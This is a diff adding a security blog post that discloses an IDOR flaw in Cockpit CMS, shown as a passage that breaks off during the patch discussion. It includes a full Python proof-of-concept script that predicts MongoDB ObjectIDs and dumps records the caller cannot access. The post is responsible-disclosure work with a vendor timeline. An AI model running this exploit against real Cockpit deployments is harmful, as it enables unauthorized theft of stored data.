@@ -1,0 +1,1612 @@
+<html>
+	<head>
+		<title>Multiple Vulnerabilities in Cockpit CMS <= v2.5.2</title>
+		<meta name="description" content="Another juicy vulnerability disclosure about CSRF to RCE and XSS, plus a bonus IDOR finding in Cockpit CMS." />
+		<meta name="robots" content="index, follow" />
+		<meta property="og:title" content="Multiple Vulnerabilities in Cockpit CMS <= v2.5.2" />
+		<meta property="og:site_name" content="GhostCcamm's Cyber Misadventures" />
+		<meta property="og:description" content="Another juicy vulnerability disclosure about CSRF to RCE and XSS, plus a bonus IDOR finding in Cockpit CMS." />
+		
+        <meta property="og:image" content="/images/blog/multi_cockpit_vulns/cockpit-logo.png" />
+    
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+		<link rel="stylesheet" href="/assets/css/main.css" />
+		<link rel="stylesheet" href="/assets/css/styles.css" />
+		<noscript><link rel="stylesheet" href="/assets/css/noscript.css" /></noscript>
+	</head>
+	<body class="is-preload">
+
+		<!-- Page Wrapper -->
+			<div id="page-wrapper">
+
+			<!-- Header -->
+				<header id="header" class="alt">
+					<h1><a href="index.html">GhostCcamm's Cyber Misadventures</a></h1>
+					<nav>
+						<a href="#menu">Menu</a>
+					</nav>
+				</header>
+
+			<!-- Menu -->
+				<nav id="menu">
+					<div class="inner">
+						<h2>Menu</h2>
+						<ul class="links">
+							<li><a href="/">Home</a></li>
+							<li><a href="/blog">Blog</a></li>
+							<li><a href="/writeups">Write Ups</a></li>
+						</ul>
+						<a href="#" class="close">Close</a>
+					</div>
+				</nav>
+
+			<!-- Banner -->
+		    <section id="banner">
+		      <div class="inner">
+		        <div class="logo"><div class="image"><img src="/images/logo.png" alt="" width="75" height="75" /></div></div>
+		        <h2>Multiple Vulnerabilities in Cockpit CMS <= v2.5.2</h2>
+						<p class="date">2023-06-30</p>
+		        <p>Another juicy vulnerability disclosure about CSRF to RCE and XSS, plus a bonus IDOR finding in Cockpit CMS."</p>
+		      </div>
+		    </section>
+
+      <section id="wrapper">
+<section class="wrapper style1 ">
+<div class="inner">
+<div class="content">
+<h1 class="major" id="overview">
+ Overview
+</h1>
+<p>
+ So I got bored again and decided to look at another open-source CMS project in the little hobby hacking time I had outside of work. The project that caught my attention was Cockpit CMS, a headless CMS that is written in PHP. I found a fairly cool Insecure Direct Object Reference (IDOR) vulnerability and CSRF issues everywhere on the admin portal that could be exploited to get RCE.
+</p>
+<p>
+ Let's just jump right in and skip my nonsensical preamble.
+</p>
+<p>
+ <strong>
+  Table of Contents
+ </strong>
+</p>
+<div class="toc">
+ <ul>
+  <li>
+   <a href="#overview">
+    Overview
+   </a>
+  </li>
+  <li>
+   <a href="#vulnerabilities-disclosure-timeline">
+    Vulnerabilities Disclosure Timeline
+   </a>
+  </li>
+  <li>
+   <a href="#what-is-cockpit-cms">
+    What is Cockpit CMS?
+   </a>
+  </li>
+  <li>
+   <a href="#exploiting-relational-mappings-in-the-content-api">
+    Exploiting Relational Mappings in the Content API
+   </a>
+   <ul>
+    <li>
+     <a href="#the-issue-of-populating-relational-mappings">
+      The Issue of Populating Relational Mappings
+     </a>
+    </li>
+    <li>
+     <a href="#mongodb-object-ids-are-not-secure">
+      MongoDB Object IDs are Not Secure
+     </a>
+    </li>
+    <li>
+     <a href="#poc">
+      POC
+     </a>
+    </li>
+    <li>
+     <a href="#how-cockpit-cms-patched-this-vulnerability">
+      How Cockpit CMS Patched This Vulnerability
+     </a>
+    </li>
+   </ul>
+  </li>
+  <li>
+   <a href="#csrf-everywhere">
+    CSRF Everywhere...
+   </a>
+   <ul>
+    <li>
+     <a href="#lets-play-a-game">
+      Let's Play a Game
+     </a>
+    </li>
+    <li>
+     <a href="#csrf-to-xss">
+      CSRF to XSS
+     </a>
+     <ul>
+      <li>
+       <a href="#csrf-to-xss-poc">
+        CSRF to XSS POC
+       </a>
+      </li>
+     </ul>
+    </li>
+    <li>
+     <a href="#csrf-to-rce">
+      CSRF to RCE
+     </a>
+     <ul>
+      <li>
+       <a href="#csrf-to-rce-poc">
+        CSRF to RCE POC
+       </a>
+      </li>
+     </ul>
+    </li>
+    <li>
+     <a href="#how-cockpit-cms-patched-this-vulnerability_1">
+      How Cockpit CMS Patched This Vulnerability
+     </a>
+    </li>
+   </ul>
+  </li>
+  <li>
+   <a href="#a-note-about-secure-by-default-and-documenting-configuration-settings">
+    A Note About Secure by Default and Documenting Configuration Settings
+   </a>
+   <ul>
+    <li>
+     <a href="#setting-an-allow-list-for-assets-api-uploads">
+      Setting an Allow List for Assets API Uploads
+     </a>
+    </li>
+    <li>
+     <a href="#how-to-secure-the-finder-api">
+      How to secure the Finder API?
+     </a>
+    </li>
+    <li>
+     <a href="#change-your-application-security-keys">
+      Change Your Application Security Keys!
+     </a>
+    </li>
+    <li>
+     <a href="#harden-php-session-cookies">
+      Harden PHP Session Cookies
+     </a>
+    </li>
+   </ul>
+  </li>
+  <li>
+   <a href="#conclusion">
+    Conclusion
+   </a>
+  </li>
+ </ul>
+</div>
+</div>
+</div>
+</section>
+<section class="wrapper style5 alt">
+<div class="inner">
+<div class="content">
+
+<h1 class="major" id="vulnerabilities-disclosure-timeline">
+ Vulnerabilities Disclosure Timeline
+</h1>
+<table>
+ <thead>
+  <tr>
+   <th>
+    Time
+   </th>
+   <th>
+    Event
+   </th>
+  </tr>
+ </thead>
+ <tbody>
+  <tr>
+   <td>
+    2023/05/29
+   </td>
+   <td>
+    Reported the IDOR vulnerability to Cockpit CMS
+   </td>
+  </tr>
+  <tr>
+   <td>
+    2023/05/31
+   </td>
+   <td>
+    Artur from Cockpit CMS added patch to dev release.
+   </td>
+  </tr>
+  <tr>
+   <td>
+    2023/06/08
+   </td>
+   <td>
+    Reported the CSRF vulnerabilities to Cockpit CMS
+   </td>
+  </tr>
+  <tr>
+   <td>
+    2023/06/08
+   </td>
+   <td>
+    Artur added CSRF check for administrator portal API (7 hours after initial report).
+   </td>
+  </tr>
+  <tr>
+   <td>
+    2023/06/21
+   </td>
+   <td>
+    Cockpit CMS v2.6.0 was released with the patches
+   </td>
+  </tr>
+ </tbody>
+</table>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_cockpit_vulns/artur-patching-vulns.gif"/>
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style2 ">
+<div class="inner">
+<div class="content">
+
+<h1 class="major" id="what-is-cockpit-cms">
+ What is Cockpit CMS?
+</h1>
+<p>
+ Before we dig into the more technical details, I will need to quickly explain what is Cockpit CMS and a high level overview about how it works. Cockpit CMS is fairly popular headless CMS for building REST and GraphQL APIs. It is a nice simple CMS that makes backend web API development extremely easy. It is also built for NoSQL database management systems such as MongoDB making the CMS horizontally scalable.
+</p>
+<p>
+ However, this opens up the CMS to the possibility of
+ <a href="https://github.com/0z09e/CVE-2020-35846">
+  NoSQL injection attacks
+ </a>
+ that resulted in severe vulnerabilities in the past. In addition, the CMS is written in PHP which is my personal least favourite language for web development (
+ <em>
+  this is a personal opinion and a joke
+ </em>
+ ).
+</p>
+<p>
+ So now you have a basic idea about Cockpit CMS, let's get into the fun part.
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style4 alt">
+<div class="inner">
+<div class="content">
+
+<h1 class="major" id="exploiting-relational-mappings-in-the-content-api">
+ Exploiting Relational Mappings in the Content API
+</h1>
+<p>
+ Relational mappings are great for storing complex data structures on databases. However, as I pointed out in my
+ <a href="https://www.ghostccamm.com/blog/multi_strapi_vulns/">
+  Strapi vulnerability disclosures early this year
+ </a>
+ they pose a significant threat of being exploited to leak sensitive data.
+</p>
+<p>
+ Looking at Cockpit CMS, I discovered that it had Insecure Direct Object Reference (IDOR) vulnerability by exploiting relational mappings when populating fields. It is a pretty cool finding, so enjoy the details.
+</p>
+<h2 class="major" id="the-issue-of-populating-relational-mappings">
+ The Issue of Populating Relational Mappings
+</h2>
+<p>
+ All actions for content besides files are handled by an API called
+ <code>
+  Content
+ </code>
+ (surprising name choice) and the source code is located in the
+ <a href="https://github.com/Cockpit-HQ/Cockpit/tree/2.5.2/modules/Content">
+  <code>
+   modules/Content
+  </code>
+  folder
+ </a>
+ . Of particular interest to me was how the relational mappings were populated in the
+ <a href="https://github.com/Cockpit-HQ/Cockpit/blob/2.5.2/modules/Content/bootstrap.php#L409">
+  <code>
+   populate
+  </code>
+  function in
+  <code>
+   bootstrap.php
+  </code>
+ </a>
+ (snippet of code below).
+</p>
+<div class="codehilite">
+ <pre><span></span><code><span class="x">if (isset($v['_id'], $v['_model'])) {</span>
+
+<span class="x">    $model = $v['_model'];</span>
+<span class="x">    $array[$k] = $this-&gt;_resolveContentRef($v['_model'], (string)$v['_id'], $process);</span>
+
+<span class="x">    if ($array[$k]) {</span>
+<span class="x">        $array[$k] = $this-&gt;populate($array[$k], $maxlevel, ($level + 1), $process);</span>
+<span class="x">        $array[$k]['_model'] = $model;</span>
+<span class="x">    }</span>
+<span class="x">}</span>
+</code></pre>
+</div>
+<p>
+ Explaining in english the above code, if the data that is being populated has an attribute named
+ <code>
+  _id
+ </code>
+ and
+ <code>
+  _model
+ </code>
+ then Cockpit CMS would resolve the mapping and fetch the corresponding data. The massive problem here is that
+ <strong>
+  there is no validation if the querying user is authorised to access that data
+ </strong>
+ .
+</p>
+<p>
+ Now this would be an interesting finding if I could find a way to inject in the
+ <code>
+  _model
+ </code>
+ and
+ <code>
+  _id
+ </code>
+ attributes into this populate function. So I decided to start up a test Cockpit CMS server on my local VM and analyse how data is handled on the CMS.
+</p>
+<p>
+ To do this, I created two separate Collections and configured one of the fields to be a "Link" to an entry in the other collection.
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_cockpit_vulns/testlink.png"/>
+</p>
+<p>
+ Then I simply created a new object using the Admin UI and took a look at the request.
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_cockpit_vulns/testlink-request.png"/>
+</p>
+<p>
+ <em>
+  Hmmmmm
+ </em>
+</p>
+<p>
+ That is very interesting that in the user's JSON request the
+ <code>
+  _model
+ </code>
+ and
+ <code>
+  _id
+ </code>
+ values are set. This lead to my next question:
+</p>
+<p>
+ <em>
+  Does the server actually validate the type of link that the user sends is the same as the one configured on the model?
+ </em>
+</p>
+<p>
+ To test this theory, I simply created another collection named "Secrets", created a test item and just resent the above request again.
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_cockpit_vulns/testlink-test1.png"/>
+</p>
+<p>
+ <em>
+  Hmmmmmmmmmmm
+ </em>
+</p>
+<p>
+ Now this is getting intriguing. Cockpit CMS does not validate if a relational mapping is even mapping to the configured type for the field! Plus reading the code, I knew that the user's authorisation is not validated for this mapping so I have got a vulnerability here. Saying that, at this point it was only a low severity finding since it depended on a user having write privileges to a collection with a relational field...
+</p>
+<p>
+ <em>
+  Or did it?
+ </em>
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_cockpit_vulns/hmmmm.gif"/>
+</p>
+<p>
+ Now this is where my initial ramblings about Cockpit CMS becomes important. Cockpit CMS uses a NoSQL database management system that stores entries in a BSON structure (for simplicity just think of JSON documents). This means that if the CMS
+ <strong>
+  does not even validate the type of attributes in a user's JSON request then you could modify the BSON structure that is stored on the database
+ </strong>
+ .
+</p>
+<p>
+ To test this, I created a
+ <code>
+  Posts
+ </code>
+ collection that had two fields that were
+ <strong>
+  not
+ </strong>
+ the "Content Link" type and enabled public read and write access to the collection.
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_cockpit_vulns/posts-collection.png"/>
+</p>
+<p>
+ Now as an unauthenticated user I tried to create a Post, but manipulate the type of the "Title" field into a relational link by injecting the
+ <code>
+  _id
+ </code>
+ and
+ <code>
+  _model
+ </code>
+ attribute.
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_cockpit_vulns/setting-the-payload.png"/>
+</p>
+<p>
+ The following screenshot confirms my suspicion that Cockpit CMS was not validating the types of inputs within the JSON request and I was able to modify the "Title" attribute to a JSON structure.
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_cockpit_vulns/idor-conf1.png"/>
+</p>
+<p>
+ Now let the magic begin when I whack in
+ <code>
+  ?populate=1
+ </code>
+ into the URL to trigger the vulnerable populate function.
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_cockpit_vulns/idor-conf2.png"/>
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_cockpit_vulns/bam-peanut-butter-and-jam.gif"/>
+</p>
+<p>
+ <em>
+  However, I am not done yet.
+ </em>
+</p>
+<p>
+ The only issue is that in order to exploit this IDOR vulnerability, you need the name of the model to dump and the Object ID of the data to dump. Now the model name could be guessable, but that Object ID is not and
+ <em>
+  appears
+ </em>
+ to be random.
+</p>
+<p>
+ <em>
+  Or is it...
+ </em>
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style6 ">
+<div class="inner">
+<div class="content">
+
+<h2 class="major" id="mongodb-object-ids-are-not-secure">
+ MongoDB Object IDs are Not Secure
+</h2>
+<p>
+ The thing about MongoDB Object IDs is that although that they look like they are
+ <em>
+  'randomly'
+ </em>
+ generated, they are not secure and under certain circumstances can be guessable. Well tbh I got conflicting details
+ <a href="https://stackoverflow.com/questions/15435530/using-mongodb-generated-ids-as-secret-data-eg-oauth-tokens">
+  from this stack overflow post
+ </a>
+ , so let's dig into it further.
+</p>
+<p>
+ Looking at
+ <a href="https://www.mongodb.com/docs/manual/reference/method/ObjectId/">
+  MonogoDB's documentation about Object IDs
+ </a>
+ , an Object ID is 12 bytes in the following structure.
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_cockpit_vulns/mongodb-docs-objectid.png"/>
+</p>
+<p>
+ Now the timestamp and incremental counter can be easily bruteforced, but what about the 5-bytes with the 'random value' that is 'unique to the machine and process'? Well turns out if MongoDB server is under a high load or within a short time period then the machine and process ID remain consistent!
+ <a href="https://github.com/andresriancho/mongo-objectid-predict">
+  Someone has even made a tool for attempting to predict MongoDB Object IDs based on an initial ID
+ </a>
+ .
+</p>
+<p>
+ <em>
+  Right it looks like I have everything now to make a cool POC.
+ </em>
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style3 alt">
+<div class="inner">
+<div class="content">
+
+<h2 class="major" id="poc">
+ POC
+</h2>
+<p>
+ So my thought process for the POC was.
+</p>
+<ol>
+ <li>
+  Create an item to get the Object ID to seed
+  <a href="https://github.com/andresriancho/mongo-objectid-predict">
+   this MongoDB Object ID predictor
+  </a>
+  .
+ </li>
+ <li>
+  Generate a list of possible MongoDB Object IDs that are likely within the minute.
+ </li>
+ <li>
+  Spray and pray the exploit.
+ </li>
+</ol>
+<p>
+ Below was the POC I sent the developers at Cockpit CMS along with the following GIF.
+</p>
+<details>
+ <summary>
+  <b>
+   <code>
+    cockpit-blaster.py
+   </code>
+  </b>
+ </summary>
+ <div class="codehilite">
+  <pre><span></span><code><span class="kn">import</span> <span class="nn">argparse</span><span class="o">,</span> <span class="nn">json</span><span class="o">,</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">tqdm</span>
+<span class="kn">from</span> <span class="nn">mongo_objectid_predict</span> <span class="kn">import</span> <span class="n">predict</span>
+<span class="kn">from</span> <span class="nn">typing</span> <span class="kn">import</span> <span class="n">Optional</span>
+<span class="kn">from</span> <span class="nn">colorama</span> <span class="kn">import</span> <span class="n">Fore</span><span class="p">,</span> <span class="n">Style</span>
+
+<span class="k">def</span> <span class="nf">parse_args</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="n">argparse</span><span class="o">.</span><span class="n">Namespace</span><span class="p">:</span>
+    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">formatter_class</span><span class="o">=</span><span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentDefaultsHelpFormatter</span><span class="p">)</span>
+
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
+        <span class="s1">'target'</span><span class="p">,</span>
+        <span class="n">help</span><span class="o">=</span><span class="s1">'URL to the target API endpoint. Eg. http://127.0.0.1/api/content/Items'</span><span class="p">,</span>
+    <span class="p">)</span>
+
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
+        <span class="s1">'payload_template'</span><span class="p">,</span>
+        <span class="n">help</span><span class="o">=</span><span class="s2">"JSON payload for creating an item."</span>
+    <span class="p">)</span>
+
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
+        <span class="s1">'-p'</span><span class="p">,</span> <span class="s1">'--payload-key'</span><span class="p">,</span>
+        <span class="n">help</span><span class="o">=</span><span class="s1">'The key in the payload_template to replace with payloads.'</span><span class="p">,</span>
+        <span class="n">required</span><span class="o">=</span><span class="kc">True</span>
+    <span class="p">)</span>
+
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
+        <span class="s1">'-k'</span><span class="p">,</span> <span class="s1">'--api-key'</span><span class="p">,</span>
+        <span class="n">help</span><span class="o">=</span><span class="s1">'API key if required to access the API endpoint'</span>
+    <span class="p">)</span>
+
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
+        <span class="s1">'-m'</span><span class="p">,</span> <span class="s1">'--model'</span><span class="p">,</span>
+        <span class="n">help</span><span class="o">=</span><span class="s1">'The name of the model that you want to dump items for that you cannot directly access.'</span><span class="p">,</span>
+        <span class="n">required</span><span class="o">=</span><span class="kc">True</span>
+    <span class="p">)</span>
+
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
+        <span class="s1">'--counter-diff'</span><span class="p">,</span>
+        <span class="n">help</span><span class="o">=</span><span class="s1">'Amount to bruteforce in the 3-byte counter in the MongoDB ObjectID'</span><span class="p">,</span>
+        <span class="n">default</span><span class="o">=</span><span class="mi">120</span><span class="p">,</span>
+        <span class="nb">type</span><span class="o">=</span><span class="nb">int</span>
+    <span class="p">)</span>
+
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
+        <span class="s1">'--per-counter'</span><span class="p">,</span>
+        <span class="n">help</span><span class="o">=</span><span class="s1">'How many seconds to bruteforce the ObjectID'</span><span class="p">,</span>
+        <span class="n">default</span><span class="o">=</span><span class="mi">1800</span><span class="p">,</span>
+        <span class="nb">type</span><span class="o">=</span><span class="nb">int</span>
+    <span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">create_item</span><span class="p">(</span><span class="n">target</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">template</span><span class="p">:</span> <span class="nb">dict</span><span class="p">,</span> <span class="n">payload_key</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">payload_value</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">api_key</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="nb">str</span><span class="p">]</span><span class="o">=</span><span class="kc">None</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">requests</span><span class="o">.</span><span class="n">Response</span><span class="p">:</span>
+    <span class="n">template</span><span class="p">[</span><span class="s2">"data"</span><span class="p">][</span><span class="n">payload_key</span><span class="p">]</span> <span class="o">=</span> <span class="n">payload_value</span>
+
+    <span class="k">if</span> <span class="n">api_key</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
+            <span class="n">target</span><span class="p">,</span>
+            <span class="n">json</span><span class="o">=</span><span class="n">template</span>
+        <span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
+        <span class="n">target</span><span class="p">,</span>
+        <span class="n">json</span><span class="o">=</span><span class="n">template</span><span class="p">,</span>
+        <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s2">"api-key"</span><span class="p">:</span> <span class="n">api_key</span><span class="p">}</span>
+    <span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">attempt_to_dump_obj</span><span class="p">(</span><span class="n">target</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">template</span><span class="p">:</span> <span class="nb">dict</span><span class="p">,</span> <span class="n">model_name</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="nb">id</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">payload_key</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">api_key</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="nb">str</span><span class="p">]</span><span class="o">=</span><span class="kc">None</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bool</span><span class="p">:</span>
+    <span class="n">obj_ref</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"_model"</span><span class="p">:</span> <span class="n">model_name</span><span class="p">,</span> <span class="s2">"_id"</span><span class="p">:</span> <span class="nb">id</span><span class="p">}</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">create_item</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">template</span><span class="p">,</span> <span class="n">payload_key</span><span class="p">,</span> <span class="n">obj_ref</span><span class="p">,</span> <span class="n">api_key</span><span class="o">=</span><span class="n">api_key</span><span class="p">)</span>
+    <span class="n">new_id</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s2">"_id"</span><span class="p">]</span>
+
+    <span class="k">if</span> <span class="n">api_key</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
+            <span class="n">target</span><span class="p">,</span>
+            <span class="n">params</span><span class="o">=</span><span class="p">{</span>
+                <span class="s2">"filter"</span><span class="p">:</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s2">"_id"</span><span class="p">:</span><span class="n">new_id</span><span class="p">}),</span>
+                <span class="s2">"populate"</span><span class="p">:</span><span class="mi">1</span>
+            <span class="p">}</span>
+        <span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
+            <span class="n">target</span><span class="p">,</span>
+            <span class="n">params</span><span class="o">=</span><span class="p">{</span>
+                <span class="s2">"filter"</span><span class="p">:</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s2">"_id"</span><span class="p">:</span><span class="n">new_id</span><span class="p">}),</span>
+                <span class="s2">"populate"</span><span class="p">:</span><span class="mi">1</span>
+            <span class="p">},</span>
+            <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s2">"api-key"</span><span class="p">:</span> <span class="n">api_key</span><span class="p">}</span>
+        <span class="p">)</span>
+
+    <span class="n">r_json</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
+
+    <span class="k">if</span> <span class="s2">"error"</span> <span class="ow">in</span> <span class="n">r_json</span><span class="p">:</span>
+        <span class="k">return</span> <span class="kc">False</span>
+
+    <span class="k">if</span> <span class="n">r_json</span><span class="p">[</span><span class="n">payload_key</span><span class="p">]:</span>
+        <span class="nb">print</span><span class="p">()</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">Fore</span><span class="o">.</span><span class="n">GREEN</span><span class="si">}</span><span class="s2">Found item for </span><span class="si">{</span><span class="n">Style</span><span class="o">.</span><span class="n">BRIGHT</span><span class="si">}{</span><span class="n">Fore</span><span class="o">.</span><span class="n">CYAN</span><span class="si">}{</span><span class="n">model_name</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">Style</span><span class="o">.</span><span class="n">RESET_ALL</span><span class="si">}{</span><span class="n">Fore</span><span class="o">.</span><span class="n">GREEN</span><span class="si">}</span><span class="s2">model!</span><span class="si">{</span><span class="n">Style</span><span class="o">.</span><span class="n">RESET_ALL</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">Style</span><span class="o">.</span><span class="n">BRIGHT</span><span class="si">}{</span><span class="n">Fore</span><span class="o">.</span><span class="n">RED</span><span class="si">}{</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">r_json</span><span class="p">[</span><span class="n">payload_key</span><span class="p">],</span> <span class="n">indent</span><span class="o">=</span><span class="mi">4</span><span class="p">)</span><span class="si">}{</span><span class="n">Style</span><span class="o">.</span><span class="n">RESET_ALL</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">()</span>
+        <span class="k">return</span> <span class="kc">True</span>
+    <span class="k">return</span> <span class="kc">False</span>
+
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">args</span><span class="p">:</span> <span class="n">argparse</span><span class="o">.</span><span class="n">Namespace</span><span class="p">):</span>
+    <span class="n">target</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">target</span>
+    <span class="n">payload_template</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">payload_template</span><span class="p">)</span>
+    <span class="n">api_key</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">api_key</span>
+    <span class="n">target_model</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">model</span>
+    <span class="n">payload_key</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">payload_key</span>
+    <span class="n">counter_diff</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">counter_diff</span>
+    <span class="n">per_counter</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">per_counter</span>
+
+    <span class="c1"># Get initial ID</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">create_item</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">payload_template</span><span class="p">,</span> <span class="n">payload_key</span><span class="p">,</span> <span class="s1">'Test'</span><span class="p">,</span> <span class="n">api_key</span><span class="o">=</span><span class="n">api_key</span><span class="p">)</span>
+    <span class="n">base_id</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s2">"_id"</span><span class="p">]</span>
+
+    <span class="c1"># Search around the base ID to dump items from the other model</span>
+    <span class="k">for</span> <span class="n">test_id</span> <span class="ow">in</span> <span class="n">tqdm</span><span class="o">.</span><span class="n">tqdm</span><span class="p">(</span><span class="n">predict</span><span class="p">(</span><span class="n">base_id</span><span class="p">,</span> <span class="n">backward</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">counter_diff</span><span class="o">=</span><span class="n">counter_diff</span><span class="p">,</span> <span class="n">per_counter</span><span class="o">=</span><span class="n">per_counter</span><span class="p">)):</span>
+        <span class="k">if</span> <span class="n">attempt_to_dump_obj</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">payload_template</span><span class="p">,</span> <span class="n">target_model</span><span class="p">,</span> <span class="n">test_id</span><span class="p">,</span> <span class="n">payload_key</span><span class="p">,</span> <span class="n">api_key</span><span class="o">=</span><span class="n">api_key</span><span class="p">):</span>
+            <span class="k">break</span>
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">"__main__"</span><span class="p">:</span>
+    <span class="n">args</span> <span class="o">=</span> <span class="n">parse_args</span><span class="p">()</span>
+    <span class="n">main</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>
+</code></pre>
+ </div>
+</details>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_cockpit_vulns/cockpit-idor-dump.gif"/>
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style4 ">
+<div class="inner">
+<div class="content">
+
+<h2 class="major" id="how-cockpit-cms-patched-this-vulnerability">
+ How Cockpit CMS Patched This Vulnerability
+</h2>
+<p>
+ Artur from Cockpit CMS released a patch version to test
+ <strong>
+  two days after my disclosure
+ </strong>
+ (
+ <em>
+  one of the fastest patches I have seen
+ </em>
+ ) with the following change to the
+ <code>
+  populate
+ </code>
+ function.
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_cockpit_vulns/idor-patch.png"/>
+</p>
+<p>
+ Although this code change
+ <em>
+  does patch the vulnerability
+ </em>
+ , there is still an edge case that could occur to make this exploited. Notice that if
+ <code>
+  isset($proccess['user']['role'])
+ </code>
+ is not set then the
+ <code>
+  allowedModels
+ </code>
+ verification is not executed and the vulnerability is still exploitable.
+</p>
+<p>
+ <em>
+  So when could this scenario could occur?
+ </em>
+</p>
+<p>
+ Looking into how users are created, an admin creates on the administrator portal. However, you can create an account
+ <strong>
+  without a role assigned
+ </strong>
+ as shown in the following JSON request.
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_cockpit_vulns/norole1.png"/>
+</p>
+<p>
+ Results in the
+ <code>
+  role
+ </code>
+ <strong>
+  not
+ </strong>
+ being set for the account.
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_cockpit_vulns/norole2.png"/>
+</p>
+<p>
+ So an account can be created without a role assigned to it, but the following lines of code prevent exploitation if you are using the Cockpit CMS api since the Content API validates the role's permissions first.
+</p>
+<p>
